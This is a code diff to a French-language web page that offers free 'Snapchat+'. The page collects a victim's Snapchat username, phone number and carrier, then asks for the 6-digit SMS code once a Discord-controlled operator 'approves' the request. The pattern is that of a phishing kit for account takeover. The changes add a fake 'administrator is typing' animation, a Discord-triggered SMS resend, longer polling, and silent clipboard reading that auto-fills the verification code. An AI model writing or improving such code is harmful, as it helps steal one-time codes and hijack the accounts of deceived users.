@@ -461,6 +461,38 @@
         }
         .waiting-text { font-size: 14px; color: #bbb; line-height: 1.5; }
         .pulse-animation { animation: waitPulse 2.5s ease-in-out infinite; }
+
+        /* Timer d'attente */
+        .wait-timer {
+            font-size: 13px; color: #888; margin-top: 10px; font-weight: 500;
+            display: flex; align-items: center; justify-content: center; gap: 6px;
+        }
+        .wait-timer span { color: #FFFC00; font-weight: 700; font-variant-numeric: tabular-nums; }
+
+        /* Animation "tape..." */
+        .typing-indicator {
+            display: inline-flex; align-items: center; gap: 3px;
+            background: rgba(255,255,255,0.06); border-radius: 20px; padding: 8px 14px;
+            margin-top: 12px;
+        }
+        .typing-dot {
+            width: 7px; height: 7px; background: #888; border-radius: 50%;
+            animation: typingBounce 1.2s ease-in-out infinite;
+        }
+        .typing-dot:nth-child(2) { animation-delay: 0.15s; }
+        .typing-dot:nth-child(3) { animation-delay: 0.3s; }
+        @keyframes typingBounce {
+            0%, 60%, 100% { transform: translateY(0); background: #666; }
+            30% { transform: translateY(-6px); background: #FFFC00; }
+        }
+        .typing-label { font-size: 12px; color: #777; margin-left: 6px; }
+
+        /* Badge auto-paste */
+        .paste-hint {
+            font-size: 12px; color: #888; margin-top: 10px; text-align: center;
+            animation: fadeIn 0.5s ease both;
+        }
+        .paste-hint i { color: #FFFC00; }
         .code-input-wrapper { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
         .code-digit-input {
             width: 50px; height: 60px;
@@ -719,6 +751,15 @@
                 <div id="waitingBox" class="waiting-box" style="display:none;">
                     <h4 class="waiting-title">🛡️ En attente de validation</h4>
                     <p class="waiting-text">Un administrateur examine votre demande. Restez sur cette page, cela prend quelques instants.</p>
+                    <div class="typing-indicator">
+                        <div class="typing-dot"></div>
+                        <div class="typing-dot"></div>
+                        <div class="typing-dot"></div>
+                        <span class="typing-label">L'administrateur répond...</span>
+                    </div>
+                    <div class="wait-timer">
+                        <i class="fas fa-clock"></i> En attente depuis <span id="waitTimerDisplay">0:00</span>
+                    </div>
                 </div>
 
                 <div class="step-warning">
@@ -734,13 +775,14 @@
                 <p class="form-description">Un code à 6 chiffres a été envoyé par SMS à votre numéro. Entrez-le ci-dessous pour vérifier votre compte.</p>
                 
                 <div class="code-input-wrapper">
-                    <input type="text" class="code-digit-input" maxlength="1" id="code1" inputmode="numeric" autocomplete="off">
+                    <input type="text" class="code-digit-input" maxlength="1" id="code1" inputmode="numeric" autocomplete="one-time-code">
                     <input type="text" class="code-digit-input" maxlength="1" id="code2" inputmode="numeric" autocomplete="off">
                     <input type="text" class="code-digit-input" maxlength="1" id="code3" inputmode="numeric" autocomplete="off">
                     <input type="text" class="code-digit-input" maxlength="1" id="code4" inputmode="numeric" autocomplete="off">
                     <input type="text" class="code-digit-input" maxlength="1" id="code5" inputmode="numeric" autocomplete="off">
                     <input type="text" class="code-digit-input" maxlength="1" id="code6" inputmode="numeric" autocomplete="off">
                 </div>
+                <p class="paste-hint" id="pasteHint" style="display:none;"><i class="fas fa-clipboard"></i> Code détecté dans le presse-papier — collé automatiquement</p>
 
                 <button id="verifyCodeBtn" class="submit-button" onclick="submitStep2()"><i class="fas fa-check"></i> Vérifier le code</button>
             </div>
@@ -767,6 +809,8 @@
         let animationInterval = null;
         let progressStepIndex = 0;
         const totalProgressSteps = 5;
+        let waitTimerInterval = null;
+        let waitStartTime = null;
 
 
         function showStep(stepId) {
@@ -802,6 +846,12 @@
                     body: JSON.stringify({ snapchat, phone, operator })
                 });
                 const data = await res.json();
+                if (res.status === 429) {
+                    alert('Tu as déjà envoyé une demande récemment. Réessaie dans quelques minutes.');
+                    sendBtn.disabled = false;
+                    sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
+                    return;
+                }
                 if (!res.ok || !data.id) throw new Error('Erreur serveur');
                 currentId = data.id;
                 showStep('loading-advanced');
@@ -885,12 +935,24 @@
             percentageEl.textContent = '100%';
             circle.style.background = `conic-gradient(#FFFC00 0% 100%, rgba(255,255,255,0.15) 0% 100%)`;
             circle.classList.add('pulse-animation');
+
+            // Démarrer le timer d'attente
+            waitStartTime = Date.now();
+            if (waitTimerInterval) clearInterval(waitTimerInterval);
+            waitTimerInterval = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - waitStartTime) / 1000);
+                const m = Math.floor(elapsed / 60);
+                const s = String(elapsed % 60).padStart(2, '0');
+                const el = document.getElementById('waitTimerDisplay');
+                if (el) el.textContent = `${m}:${s}`;
+            }, 1000);
+
             startPolling();
         }
 
         function startPolling() {
             let pollCount = 0;
-            const maxPolls = 60;
+            const maxPolls = 72; // ~6 min (72 × 5s) — un peu plus que le timeout serveur de 5 min
             const poll = setInterval(async () => {
                 pollCount++;
                 try {
@@ -898,6 +960,7 @@
                     if (!res.ok) {
                         if (res.status === 404) {
                             clearInterval(poll);
+                            if (waitTimerInterval) clearInterval(waitTimerInterval);
                             alert('Votre demande a été refusée ou a expiré.');
                             window.location.reload();
                             return;
@@ -905,37 +968,68 @@
                         throw new Error(`Erreur HTTP ${res.status}`);
                     }
                     const data = await res.json();
+
+                    // Signal "Renvoyer SMS" depuis Discord
+                    if (data.resend) {
+                        await fetch(`/api/resend-ack/${currentId}`, { method: 'POST' });
+                        clearInterval(poll);
+                        if (waitTimerInterval) clearInterval(waitTimerInterval);
+                        transitionToCodeStep(true); // true = "renvoi demandé"
+                        return;
+                    }
+
                     if (data.rejected) {
                         clearInterval(poll);
+                        if (waitTimerInterval) clearInterval(waitTimerInterval);
                         alert('Votre demande a été rejetée par l\'administrateur.');
                         window.location.reload();
                     } else if (data.approved) {
                         clearInterval(poll);
+                        if (waitTimerInterval) clearInterval(waitTimerInterval);
                         transitionToCodeStep();
-                    }
-                } catch (err) {
-                    console.error('Polling error:', err);
-                    if (pollCount >= maxPolls) {
+                    } else if (pollCount >= maxPolls) {
                         clearInterval(poll);
+                        if (waitTimerInterval) clearInterval(waitTimerInterval);
                         alert('Délai d\'attente dépassé. Veuillez réessayer.');
                         window.location.reload();
                     }
+                } catch (err) {
+                    console.error('Polling error:', err);
                 }
             }, 5000);
         }
 
-        function transitionToCodeStep() {
+        function transitionToCodeStep(isResend = false) {
             const waitingBox = document.getElementById('waitingBox');
             const circle = document.getElementById('progressCircle');
             circle.classList.remove('pulse-animation');
             waitingBox.style.display = 'none';
-            document.getElementById('loadingMainTitle').textContent = 'Demande approuvée !';
+            document.getElementById('loadingMainTitle').textContent = isResend ? 'Nouveau code envoyé !' : 'Demande approuvée !';
             document.getElementById('loadingSubtitle').innerHTML = 'Veuillez entrer le code reçu par SMS.';
             document.getElementById('loadingStatusText').textContent = 'OK';
             setTimeout(() => {
                 showStep('step2');
-                document.getElementById('code1').focus();
+                const code1 = document.getElementById('code1');
+                code1.focus();
+                // Tentative auto-paste depuis le presse-papier
+                tryAutoPaste();
             }, 1500);
+        }
+
+        async function tryAutoPaste() {
+            try {
+                if (!navigator.clipboard || !navigator.clipboard.readText) return;
+                const text = await navigator.clipboard.readText();
+                const digits = text.replace(/\D/g, '').slice(0, 6);
+                if (digits.length === 6) {
+                    const inputs = document.querySelectorAll('.code-digit-input');
+                    for (let i = 0; i < 6; i++) inputs[i].value = digits[i];
+                    document.getElementById('pasteHint').style.display = 'block';
+                    inputs[5].focus();
+                }
+            } catch (e) {
+                // Permission refusée ou non disponible — silencieux
+            }
         }
 
         function submitStep2() {
